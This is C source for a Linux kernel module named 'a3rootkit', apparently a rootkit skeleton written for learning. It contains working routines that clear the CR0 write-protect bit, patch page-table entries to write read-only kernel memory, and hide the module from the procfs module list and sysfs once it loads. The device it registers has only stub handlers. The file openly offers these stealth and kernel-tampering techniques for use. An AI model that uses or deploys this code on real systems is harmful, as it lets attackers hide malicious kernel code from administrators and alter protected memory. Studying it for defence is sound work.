#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/device.h>
#include <asm/io.h>
#include <asm/pgtable.h>
#include <asm-generic/memory_model.h>
#include <asm/pgtable_types.h>

#define DEVICE_NAME "a3rootkit"
#define CLASS_NAME "a3rootkit"

static int major_num;
static struct class *module_class;
static struct device *module_device;

static int a3_rootkit_open(struct inode *, struct file *);
static ssize_t a3_rootkit_read(struct file *, char __user *, size_t, loff_t *);
static ssize_t a3_rootkit_write(struct file *, const char __user *, size_t, loff_t *);
static int a3_rootkit_release(struct inode *, struct file *);
static long a3_rootkit_ioctl(struct file *, unsigned int, unsigned long);

static struct file_operations a3_rootkit_ops = {
    .open = a3_rootkit_open,
    .read = a3_rootkit_read,
    .write = a3_rootkit_write,
    .release = a3_rootkit_release,
    .unlocked_ioctl = a3_rootkit_ioctl,
};

//读取cr0寄存器
size_t a3_rootkit_read_cr0(void)
{
    size_t cr0;

    asm volatile (
        "movq  %%cr0, %%rax;"
        "movq  %%rax, %0;   "
        : "=r" (cr0) :: "%rax"
    );

    return cr0;
}

//写入数据到cr0寄存器
void a3_rootkit_write_cr0(size_t cr0)
{
    asm volatile (
        "movq   %0, %%rax;  "
        "movq  %%rax, %%cr0;"
        :: "r" (cr0) : "%rax"
    );
}

void a3_rootkit_disable_write_protect(void)
{
    size_t cr0_val;

    cr0_val = a3_rootkit_read_cr0();

    /* if already disable, do nothing */
    if ((cr0_val >> 16) & 1) {
        cr0_val &= ~(1 << 16);
        a3_rootkit_write_cr0(cr0_val);
    }
}

void a3_rootkit_enable_write_protect(void)
{
    size_t cr0_val;

    cr0_val = a3_rootkit_read_cr0();

    /* if already enable, do nothing */
    if (!((cr0_val >> 16) & 1)) {
        cr0_val |= (1 << 16);
        a3_rootkit_write_cr0(cr0_val);
    }
}

void a3_rootkit_write_read_only_mem_by_cr0(void *dst, void *src,size_t len)
{
    size_t orig_cr0;

    orig_cr0 = a3_rootkit_read_cr0();

    a3_rootkit_disable_write_protect();

    memcpy(dst, src, len);

    /* if write protection is originally disabled, just do nothing */
    if ((orig_cr0 >> 16) & 1) {
        a3_rootkit_enable_write_protect();
    }
}

void a3_rootkit_write_romem_by_pte_patch(void *dst, void *src, size_t len)
{
    pte_t *dst_pte;
    pte_t orig_pte_val;
    unsigned int level;

    dst_pte = lookup_address((unsigned long) dst, &level);
    orig_pte_val.pte = dst_pte->pte;

    dst_pte->pte |= _PAGE_RW;
    memcpy(dst, src, len);

    dst_pte->pte = orig_pte_val.pte;
}

/*hide module*/
void a3_rootkit_hide_module_sysfs(void)
{
    kobject_del(&(THIS_MODULE->mkobj.kobj));
}

void a3_rootkit_hide_module_procfs(void)
{
    struct list_head *list;

    list = &(THIS_MODULE->list);
    list->prev->next = list->next;
    list->next->prev = list->prev;
}

void a3_rootkit_hide_module(void)
{
    a3_rootkit_hide_module_procfs();
    a3_rootkit_hide_module_sysfs();
}

static int __init a3_rootkit_init(void)
{
    int err_code;
    a3_rootkit_hide_module();
    printk(KERN_INFO"[a3_rootkit:] Module loaded. start to hide module");

    printk(KERN_INFO"[a3_rootkit:] Module loaded. Start to register device...");

    /* register major num as char device */
    major_num = register_chrdev(0, DEVICE_NAME, &a3_rootkit_ops);
    if(major_num < 0) {
        printk(KERN_INFO "[a3_rootkit:] Failed to register a major number.\n");
        err_code = major_num;
        goto err_major;
    }    
    printk(KERN_INFO "[a3_rootkit:] Register complete, major number: %d\n", 
           major_num);

    /* create device class */
    module_class = class_create(THIS_MODULE, CLASS_NAME);
    if(IS_ERR(module_class)) {
        printk(KERN_INFO "[a3_rootkit:] Failed to register class device!\n");
        err_code = PTR_ERR(module_class);
        goto err_class;
    }
    printk(KERN_INFO "[a3_rootkit:] Class device register complete.\n");

    /* create device file */
    module_device = device_create(module_class, NULL, MKDEV(major_num, 0), 
                                  NULL, DEVICE_NAME);
    if(IS_ERR(module_device)) {
        printk(KERN_INFO "[a3_rootkit:] Failed to create the device!\n");
        err_code = PTR_ERR(module_device);
        goto err_dev;
    }
    printk(KERN_INFO "[a3_rootkit:] Module loaded successfully.");

    return 0;

err_dev:
    class_destroy(module_class);
err_class:
    unregister_chrdev(major_num, DEVICE_NAME);
err_major:
    return err_code;
}

static void __exit a3_rootkit_exit(void)
{
    device_destroy(module_class, MKDEV(major_num, 0));
    class_destroy(module_class);
    unregister_chrdev(major_num, DEVICE_NAME);
    printk(KERN_INFO "[a3_rootkit:] Module clean up. See you next time.");
}

static int a3_rootkit_open(struct inode *inode, struct file *file)
{
    return 0;
}

static ssize_t a3_rootkit_read(struct file *file, char __user *buf, 
                               size_t count, loff_t *start)
{
    return count;
}

static ssize_t a3_rootkit_write(struct file *file, const char __user *buf, 
                                size_t count, loff_t *start)
{
    return count;
}

static int a3_rootkit_release(struct inode *inode, struct file *file)
{
    return 0;
}

static long a3_rootkit_ioctl(struct file *file, unsigned int cmd, 
                             unsigned long arg)
{
    return 0;
}

module_init(a3_rootkit_init);
module_exit(a3_rootkit_exit);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("arttnba3");
